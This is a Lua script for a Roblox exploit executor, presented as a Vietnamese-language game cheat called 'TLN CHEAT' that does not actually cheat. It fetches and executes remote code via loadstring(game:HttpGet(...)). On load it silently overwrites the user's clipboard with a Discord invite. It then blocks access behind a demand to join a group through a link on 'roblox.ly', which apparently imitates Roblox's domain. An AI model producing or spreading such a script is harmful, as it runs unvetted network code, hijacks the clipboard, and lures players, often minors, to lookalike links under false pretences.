--// TLN CHEAT | JENSCRIPT VIỆT HÓA
-- TIKTOK: hetcuu83

--// Load Fluent UI Library
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

--// Tạo cửa sổ chính
local Window = Fluent:CreateWindow({
    Title = "TLN CHEAT",
    SubTitle = "v0.8",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 400),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

--// Liên kết
local GroupLink = "https://www.roblox.ly/communities/7892084507/Steal-an-egg-script"
local DiscordLink = "https://discord.gg/eVTAkerpaA"

--// Hàm sao chép link Discord
local function CopyDiscordLink()
    if setclipboard then
        setclipboard(DiscordLink)
        Fluent:Notify({
            Title = "TLN CHEAT",
            Content = "Đã sao chép link Discord!",
            Duration = 3
        })
    else
        Fluent:Notify({
            Title = "Lỗi",
            Content = "Executor của bạn không hỗ trợ setclipboard.",
            Duration = 3
        })
    end
end

--// Tự động sao chép link Discord khi tải
CopyDiscordLink()

--// Tab 1: Truy cập bị từ chối
local AccessTab = Window:AddTab({
    Title = "Truy Cập",
    Icon = "lock"
})

AccessTab:AddParagraph({
    Title = "Truy Cập Bị Từ Chối",
    Content = "Bạn cần tham gia nhóm để sử dụng script này."
})

--// Tab 2: Hướng dẫn & Sao chép liên kết
local TutorialTab = Window:AddTab({
    Title = "Hướng Dẫn",
    Icon = "help-circle"
})

TutorialTab:AddParagraph({
    Title = "Cách Tham Gia Nhóm",
    Content = "1. Bấm nút 'Sao Chép Link Nhóm' bên dưới.\n2. Mở trình duyệt (Chrome, Safari...).\n3. Dán link vào thanh tìm kiếm và Enter.\n4. Bấm nút 'Join Group' trên trang Roblox.\n5. Chạy lại script sau khi đã tham gia!"
})

TutorialTab:AddButton({
    Title = "Sao Chép Link Nhóm",
    Callback = function()
        if setclipboard then
            setclipboard(GroupLink)
            Fluent:Notify({
                Title = "TLN CHEAT",
                Content = "Đã sao chép link nhóm!",
                Duration = 3
            })
        else
            Fluent:Notify({
                Title = "Lỗi",
                Content = "Executor không hỗ trợ setclipboard.",
                Duration = 3
            })
        end
    end
})

TutorialTab:AddButton({
    Title = "Vào Discord (Hỗ Trợ)",
    Description = "Nếu không tham gia được nhóm, vào Discord server để được giúp đỡ!",
    Callback = function()
        CopyDiscordLink()
    end
})

--// Chọn tab ban đầu
Window:SelectTab(1)
